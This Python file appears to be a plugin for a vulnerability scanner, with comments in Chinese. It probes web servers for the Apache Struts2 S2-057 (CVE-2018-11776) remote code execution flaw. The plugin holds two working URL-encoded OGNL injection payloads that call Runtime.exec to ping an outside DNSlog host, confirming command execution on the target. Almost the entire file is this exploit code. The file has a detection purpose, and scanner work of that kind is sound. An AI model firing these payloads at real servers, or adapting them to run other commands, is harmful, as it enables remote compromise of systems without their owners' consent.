#!/usr/bin/env python
# -*- coding: utf-8 -*-
__author__ = 'Ascotbe'
from ClassCongregation import VulnerabilityDetails,ErrorLog,WriteFile,ErrorHandling,Proxies,Dnslog
import urllib3
import os.path
import requests
import urllib.parse
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
class VulnerabilityInfo(object):
    def __init__(self,Medusa):
        self.info = {}
        self.info['number']="CVE-2018-11776" #如果没有CVE或者CNVD编号就填0，CVE编号优先级大于CNVD
        self.info['author'] = "Ascotbe"  # 插件作者
        self.info['create_date']  = "2020-3-14"  # 插件编辑时间
        self.info['disclosure']='2018-8-22'#漏洞披露时间，如果不知道就写编写插件的时间
        self.info['algroup'] = "Struts2RemoteCodeExecutionVulnerability57"  # 插件名称
        self.info['name'] ='Struts2远程代码执行漏洞57' #漏洞名称
        self.info['affects'] = "Struts2"  # 漏洞组件
        self.info['desc_content'] = "该漏洞是由于在Struts2开发框架中使用namespace功能定义XML配置时，namespace值未被设置且在上层动作配置（ActionConfiguration）中未设置或用通配符namespace，可能导致远程代码执行。"  # 漏洞描述
        self.info['rank'] = "高危"  # 漏洞等级
        self.info['suggest'] = "尽快升级最新系统"  # 修复建议
        self.info['version'] = "2.3.20和2.3.34版本"  # 这边填漏洞影响的版本
        self.info['details'] = Medusa  # 结果

class UrlProcessing:  # URL处理函数
    def result(self, url):
        if url.startswith("http"):  # 判断是否有http头，如果没有就在下面加入
            res = urllib.parse.urlparse(url)
        else:
            res = urllib.parse.urlparse('http://%s' % url)
        return res.scheme, res.hostname, res.port,res.path

def medusa(Url,RandomAgent,proxies=None,**kwargs):
    proxies=Proxies().result(proxies)

    scheme, url, port,path = UrlProcessing().result(Url)
    if port is None and scheme == 'https':
        port = 443
    elif port is None and scheme == 'http':
        port = 80
    else:
        port = port
    DL=Dnslog()
    con=""
    payload1='%24%7B%28%23_memberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23w%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27'+"ping%20"+ DL.dns_host() +'%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D/'
    payload2 = "%24%7B%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23w%3D%23ct.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27" + "ping%20"+DL.dns_host() + "%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D/"
    for payload in [payload1,payload2]:
        try:
            path1=os.path.split(path)[0]
            path2 = os.path.split(path)[1]
            payload_url = scheme + "://" + url + ":" + str(port) + path1+"/"+payload+path2
            headers = {
                'User-Agent': RandomAgent,
                "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
                "Accept-Encoding": "gzip, deflate",
            }
            try:  # 防止在linux系统上执行了POC，导致超时扫描不到漏洞
                resp = requests.get(payload_url, headers=headers, timeout=6, proxies=proxies, verify=False,allow_redirects=False)
                con = resp.text
            except:
                pass
            if DL.result():
                Medusa = "{} 存在Struts2远程代码执行漏洞(S2-057)\r\n漏洞详情:\r\n版本号:S2-057\r\n使用EXP:{}\r\n返回数据:{}\r\n返回DNSLOG数据:{}\r\n使用DNSLOG:{}\r\n".format(
                    url, payload_url, con, DL.dns_text(), DL.dns_host())
                _t = VulnerabilityInfo(Medusa)
                VulnerabilityDetails(_t.info, url, **kwargs).Write()  # 传入url和扫描到的数据
                WriteFile().result(str(url), str(Medusa))  # 写入文件，url为目标文件名统一传入，Medusa为结果
        except Exception as e:
            _ = VulnerabilityInfo('').info.get('algroup')
            ErrorHandling().Outlier(e, _)
            _l = ErrorLog().Write("Plugin Name:" + _ + " || Target Url:" + url, e)  # 调用写入类


